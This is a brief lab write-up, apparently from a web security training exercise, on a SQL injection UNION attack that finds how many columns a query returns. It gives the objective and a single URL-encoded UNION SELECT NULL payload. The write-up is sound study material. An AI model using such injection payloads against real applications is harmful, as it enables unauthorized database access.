# Lab: SQL injection UNION attack, determining the number of columns returned by the query

## Objective
Perform the attack to solve SQL injection UNION attack, determining the number of columns returned by the query.

## Payload
```text
'+UNION+SELECT+NULL,NULL--
```
